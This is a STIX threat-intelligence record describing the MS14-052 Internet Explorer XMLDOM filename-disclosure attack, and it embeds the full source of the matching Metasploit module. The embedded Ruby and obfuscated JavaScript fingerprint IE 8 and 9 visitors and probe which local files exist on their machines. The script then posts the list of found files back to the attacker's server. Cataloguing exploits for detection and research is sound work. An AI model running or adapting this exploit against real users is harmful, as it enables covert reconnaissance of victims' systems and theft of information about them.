{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a1f8272-29fa-4b9c-8ec0-6d12e0df80ba",
    "created": "2024-08-14T16:31:35.114501Z",
    "modified": "2024-08-14T16:31:35.114505Z",
    "name": "\"MS14-052 Microsoft Internet Explorer XMLDOM Filename Disclosure\"",
    "description": " This module will use the Microsoft XMLDOM object to enumerate a remote machine's filenames. It will try to do so against Internet Explorer 8 and Internet Explorer 9. To use it, you must supply your own list of file paths. Each file path should look like this: c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\calc.exe  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ms14_052_xmldom.rb",
            "external_id": "ms14_052_xmldom.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-7331"
        },
        {
            "source_name": "reference",
            "url": "https://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/"
        },
        {
            "source_name": "reference",
            "url": "https://cybersecurity.att.com/blogs/labs-research/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::JSObfu\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS14-052 Microsoft Internet Explorer XMLDOM Filename Disclosure\",\n      'Description'    => %q{\n        This module will use the Microsoft XMLDOM object to enumerate a remote machine's filenames.\n        It will try to do so against Internet Explorer 8 and Internet Explorer 9. To use it, you\n        must supply your own list of file paths. Each file path should look like this:\n        c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\calc.exe\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Soroush Dalili', # @irsdl - Original discovery. MSF module is from his PoC\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-7331'],\n          [ 'MSB', 'MS14-052' ],\n          [ 'URL', 'https://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/' ],\n          [ 'URL', 'https://cybersecurity.att.com/blogs/labs-research/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi' ]\n        ],\n      'Platform'       => 'win',\n      'DisclosureDate' => '2014-09-09', # MSB. Used in the wild since Feb 2014\n      ))\n\n    register_options(\n      [\n        OptPath.new('FILES', [ true, 'A list of files to enumerate. One absolute file path per line.' ])\n      ], self.class\n    )\n  end\n\n  def js\n    target_files = parse_target_files\n    js_target_files = target_files * ','\n\n    %Q|\n    #{js_ajax_post}\n\n    var RESULTS = {\n      UNKNOWN : {value: 0, message: \"Unknown!\", color: \"black\", data: \"\"},\n      BADBROWSER: {value: 1, message: \"Browser is not supported. You need IE!\", color: \"black\", data: \"\"},\n      FILEFOUND : {value: 2, message: \"File was found!\", color: \"green\", data: \"\"},\n      FOLDERFOUND : {value: 3, message: \"Folder was found!\", color: \"green\", data: \"\"},\n      NOTFOUND : {value: 4, message: \"Object was not found!\", color: \"red\", data: \"\"},\n      ALIVE : {value: 5, message: \"Alive address!\", color: \"green\", data: \"\"},\n      MAYBEALIVE : {value: 6, message: \"Maybe an alive address!\", color: \"blue\", data: \"\"},\n      DEAD : {value: 7, message: \"Dead to me! Undetectable?\", color: \"red\", data: \"\"},\n      VALIDDRIVE : {value: 8, message: \"Available Drive!\", color: \"green\", data: \"\"},\n      INVALIDDRIVE : {value: 9, message: \"Unavailable Drive!\", color: \"red\", data: \"\"}\n    };\n\n\n    function validateXML(txt) {\n      var result = RESULTS.UNKNOWN;\n\n      if (window.ActiveXObject) {\n        var xmlDoc = new ActiveXObject(\"Microsoft.XMLDOM\");\n        xmlDoc.async = true;\n        try {\n          xmlDoc.loadXML(txt);\n          if (xmlDoc.parseError.errorCode != 0) {\n            var err;\n            err = \"Error Code: \" + xmlDoc.parseError.errorCode + \"\\\\n\";\n            err += \"Error Reason: \" + xmlDoc.parseError.reason;\n            err += \"Error Line: \" + xmlDoc.parseError.line;\n\n            var errReason = xmlDoc.parseError.reason.toLowerCase();\n            if (errReason.search('access is denied') >= 0)  {\n              result = RESULTS.ALIVE;\n            } else if(errReason.search('the system cannot locate the object') >= 0 \\|\\| errReason.search('the system cannot find the file') >= 0 \\|\\| errReason.search('the network path was not found') >= 0) {\n              result = RESULTS.NOTFOUND;\n            } else if(errReason!=''){\n              result = RESULTS.FILEFOUND;\n            } else{\n              result = RESULTS.UNKNOWN; // No Error? Unknown!\n            };\n          } else {\n            result = RESULTS.FILEFOUND;\n          }\n        } catch (e) {\n          result = RESULTS.FOLDERFOUND;\n        }\n      } else {\n        result = RESULTS.BADBROWSER;\n      }\n      result.data = \"\";\n\n      return result;\n    };\n\n\n    function checkFiles(files) {\n      var foundFiles = new Array();\n      // the first one is for all drives, the others are for the C drive only!\n      var preMagics = [\"res://\",\"\\\\\\\\\\\\\\\\localhost\\\\\\\\\", \"file:\\\\\\\\\\\\\\\\localhost\\\\\\\\\", \"file:\\\\\\\\\"];\n      // or any other irrelevant ADS! - we do not need this when we use Res://\n      var postMagics = [\"::$index_allocation\"];\n\n      var templateString = '<?xml version=\"1.0\" ?><\\!DOCTYPE anything SYSTEM \"$target$\">';\n\n      for (var i = 0; i < files.length; i++) {\n        var filename = files[i];\n        if (filename != '') {\n          filename = preMagics[0] + filename; // postMagics can be used too!\n          var result = validateXML(templateString.replace(\"$target$\", filename));\n          if (result == RESULTS.FOLDERFOUND \\|\\| result == RESULTS.ALIVE) result = RESULTS.UNKNOWN;\n          result.data = filename;\n          if (result.message.search(/file was found/i) > -1) {\n            var trimmedFilename = result.data;\n            for (var prem in preMagics)   { trimmedFilename = trimmedFilename.replace(preMagics[prem], ''); }\n            for (var postm in postMagics) { trimmedFilename = trimmedFilename.replace(postMagics[postm], ''); }\n            foundFiles.push(trimmedFilename);\n          }\n        }\n      }\n      return foundFiles;\n    };\n\n    var foundFileString = \"\";\n\n    window.onload = function() {\n      var files = [#{js_target_files}];\n      var foundFiles = checkFiles(files);\n      for (var file in foundFiles) {\n        foundFileString += foundFiles[file] + \"\\|\";\n      }\n      postInfo(\"#{get_resource}/receiver/\", foundFileString, true);\n    };\n    |\n  end\n\n  def html\n    new_js = js_obfuscate(js)\n    %Q|\n    <html>\n    <head>\n    </head>\n    <body>\n    <script>\n    #{new_js}\n    </script>\n    </body>\n    </html>\n    |\n  end\n\n  def run\n    exploit\n  end\n\n  def parse_found_files(cli, req)\n    return if req.body.blank?\n\n    files = req.body.split('|')\n    unless files.empty?\n      print_good(\"We have detected the following files:\")\n      files.each do |f|\n        report_note(host: cli.peerhost, type: 'ie.filenames', data: f)\n        print_good(f)\n      end\n    end\n  end\n\n  def parse_target_files\n    @files ||= lambda {\n      files = []\n      buf = ::File.open(datastore['FILES'], 'rb') { |f| buf = f.read }\n      buf.each_line do |line|\n        if line =~ /^[a-z]:\\\\\\\\.+/i\n          files << \"'#{line.strip}'\"\n        end\n      end\n\n      return files\n    }.call\n  end\n\n  def is_target_suitable?(user_agent)\n    info = fingerprint_user_agent(user_agent)\n    if info[:ua_name] == HttpClients::IE && (info[:ua_ver] == '8.0' || info[:ua_ver] == '9.0')\n      return true\n    end\n\n    false\n  end\n\n  def on_request_uri(cli, req)\n    unless is_target_suitable?(req.headers['User-Agent'])\n      send_not_found(cli)\n      return\n    end\n\n    case req.uri\n    when /receiver/\n      parse_found_files(cli, req)\n    else\n      print_status(\"Sending HTML.\")\n      send_response(cli, html)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-09, # MSB. Used in the wild since Feb 2014",
    "x_mitre_platforms": [
        "win'"
    ]
}